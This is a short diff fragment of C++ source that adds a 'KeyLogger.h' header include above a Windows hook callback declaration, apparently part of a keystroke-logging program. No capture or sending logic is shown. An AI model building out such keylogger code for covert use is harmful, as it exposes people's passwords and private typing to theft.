@@ -5,6 +5,9 @@
 #include <iostream>
 #include <cstdio>
 #include <fstream>
+#include <string>
+
+#include "KeyLogger.h"
 
 LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam);
 
